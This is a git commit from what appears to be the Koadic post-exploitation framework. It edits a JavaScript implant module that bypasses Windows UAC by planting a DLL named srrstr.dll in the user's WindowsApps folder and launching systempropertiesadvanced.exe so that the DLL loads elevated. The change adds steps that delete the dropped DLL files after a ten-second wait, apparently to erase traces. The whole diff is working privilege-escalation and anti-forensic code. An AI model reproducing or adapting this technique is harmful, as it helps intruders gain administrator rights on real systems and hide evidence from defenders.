62045353b07d3e2d11782a4807f4c74d17f109e6
Josue87 <j.encinar.87@gmail.com>
2020-02-27 08:55:40 +0100

    Now the DLL is deleted at the end

--- data/implant/elevate/bypassuac_systempropertiesadvanced.js
+++ data/implant/elevate/bypassuac_systempropertiesadvanced.js
@@ -4,7 +4,11 @@ try
     var myPath = "C:\\Users\\"+ '~USER~' + "\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll";
     var dll = '~DLL~'
     myObject.CopyFile (dll, myPath);
+    myObject.DeleteFile(dll);
     Koadic.shell.run("C:\\Windows\\syswow64\\systempropertiesadvanced.exe", true);
+    var now = new Date().getTime();
+    while (new Date().getTime() < now + 10000);
+    myObject.DeleteFile(myPath);
 }
 catch (e)
 {
